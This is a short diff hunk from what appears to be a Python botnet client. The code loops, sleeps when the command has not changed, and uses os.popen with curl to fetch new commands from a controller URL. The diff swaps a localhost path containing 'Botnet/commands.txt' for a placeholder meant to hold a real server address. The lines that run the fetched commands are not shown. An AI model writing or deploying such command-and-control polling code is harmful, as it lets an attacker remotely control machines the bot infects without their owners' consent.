@@ -10,4 +10,4 @@ while 1==1:
     else:
         print("Same command")
         time.sleep(5)
-        command=os.popen("curl localhost/Botnet/commands.txt").read()
+        command=os.popen("curl <Insert URL here>").read()
